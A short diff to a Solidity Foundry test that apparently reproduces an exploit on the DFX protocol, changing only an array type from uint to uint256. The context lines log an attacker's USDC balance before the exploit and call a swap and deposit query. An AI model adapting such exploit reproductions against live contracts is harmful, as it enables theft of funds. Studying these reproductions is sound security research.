@@ -46,7 +46,7 @@ contract ContractTest is DSTest {
         emit log_named_decimal_uint("[Before] Attacker USDC balance before exploit", USDC.balanceOf(address(this)), 6);
 
         USDCToXIDR();
-        uint256[] memory XIDR_USDC = new uint[](2);
+        uint256[] memory XIDR_USDC = new uint256[](2);
         XIDR_USDC[0] = 0;
         XIDR_USDC[1] = 0;
         (, XIDR_USDC) = dfx.viewDeposit(200_000 * 1e18);
